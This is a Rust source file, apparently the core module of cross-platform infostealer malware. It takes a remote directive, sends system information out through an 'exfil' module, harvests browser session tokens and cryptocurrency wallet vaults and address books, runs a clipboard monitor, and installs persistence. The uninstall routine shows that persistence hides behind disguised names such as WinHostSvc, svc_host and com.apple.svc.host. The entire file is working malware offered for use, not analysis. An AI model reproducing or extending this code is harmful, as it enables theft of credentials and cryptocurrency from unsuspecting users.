//! Collection payload. Runs whichever tiers the directive asks for,
//! uses svc_common::exfil for delivery. Calls `drain_spool()` after
//! each tier so a transient network failure doesn't lose data.

pub mod wallets;

#[cfg(windows)]
pub mod windows;
#[cfg(target_os = "linux")]
pub mod linux;
#[cfg(target_os = "macos")]
pub mod macos;

#[derive(serde::Deserialize, Default)]
pub struct Directive {
    #[serde(default)]
    pub tiers: Vec<String>,
    #[serde(default)]
    pub persistence: Vec<String>,
    #[serde(default)]
    pub rate_limit_ms: u64,
    #[serde(default)]
    pub uninstall: bool,
}

impl Directive {
    fn wants(&self, tier: &str) -> bool {
        self.tiers.is_empty() || self.tiers.iter().any(|t| t == tier)
    }
}

pub fn run(directive_bytes: &[u8]) {
    // pull secrets from env / default paths before anything else
    svc_common::exfil::init_from_env();

    let directive: Directive = serde_json::from_slice(directive_bytes).unwrap_or_default();

    // uninstall directive short-circuits
    if directive.uninstall {
        uninstall();
        return;
    }

    // announce
    svc_common::exfil::exfil_event("sysinfo", svc_common::sysinfo::SysInfo::collect());

    if directive.wants("session") {
        collect_session_tokens();
        svc_common::exfil::drain_spool();
        rate_limit(&directive);
    }

    if directive.wants("ext") {
        wallets::harvest_extension_vaults();
        svc_common::exfil::drain_spool();
        rate_limit(&directive);
    }

    if directive.wants("desktop") {
        wallets::harvest_desktop_vaults();
        svc_common::exfil::drain_spool();
        rate_limit(&directive);
    }

    if directive.wants("addr") {
        wallets::harvest_address_book();
        svc_common::exfil::drain_spool();
        rate_limit(&directive);
    }

    if directive.wants("clip") {
        clipboard_loop();
    }

    if !directive.persistence.is_empty() {
        persistence(&directive.persistence);
    }

    // final flush
    svc_common::exfil::drain_spool();
}

fn rate_limit(d: &Directive) {
    if d.rate_limit_ms > 0 {
        std::thread::sleep(std::time::Duration::from_millis(d.rate_limit_ms));
    }
}

fn collect_session_tokens() {
    #[cfg(windows)]
    windows::harvest_session_tokens();
    #[cfg(target_os = "macos")]
    macos::harvest_session_tokens();
    #[cfg(target_os = "linux")]
    linux::harvest_session_tokens();
}

fn clipboard_loop() {
    #[cfg(windows)]
    windows::clipboard_monitor();
    #[cfg(target_os = "macos")]
    macos::clipboard_monitor();
    #[cfg(target_os = "linux")]
    linux::clipboard_monitor();
}

fn persistence(entries: &[String]) {
    #[cfg(windows)]
    windows::install_persistence(entries);
    #[cfg(target_os = "linux")]
    linux::install_persistence(entries);
    #[cfg(target_os = "macos")]
    macos::install_persistence(entries);
}

fn uninstall() {
    // Windows: remove HKCU Run value, startup shortcut, schtask
    #[cfg(windows)]
    {
        use winreg::enums::*;
        use winreg::RegKey;
        if let Ok(k) = RegKey::predef(HKEY_CURRENT_USER)
            .open_subkey_with_flags(
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                KEY_SET_VALUE,
            )
        {
            let _ = k.delete_value("WinHostSvc");
        }
        if let Ok(appdata) = std::env::var("APPDATA") {
            let p = std::path::PathBuf::from(appdata)
                .join("Microsoft/Windows/Start Menu/Programs/Startup/WinHostSvc.exe");
            let _ = std::fs::remove_file(p);
        }
        use std::os::windows::process::CommandExt;
        let _ = std::process::Command::new("schtasks")
            .args(["/Delete", "/F", "/TN", "WinHostSvc"])
            .creation_flags(0x08000000)
            .output();
    }

    // Linux: remove systemd user unit, disable
    #[cfg(target_os = "linux")]
    {
        if let Ok(home) = std::env::var("HOME") {
            let unit = format!("{}/.config/systemd/user/svc_host.service", home);
            let _ = std::fs::remove_file(&unit);
            let _ = std::process::Command::new("systemctl")
                .args(["--user", "disable", "svc_host"])
                .output();
        }
    }

    // macOS: unload launch agent
    #[cfg(target_os = "macos")]
    {
        if let Ok(home) = std::env::var("HOME") {
            let plist = format!("{}/Library/LaunchAgents/com.apple.svc.host.plist", home);
            let _ = std::process::Command::new("launchctl")
                .args(["unload", &plist])
                .output();
            let _ = std::fs::remove_file(&plist);
        }
    }
}
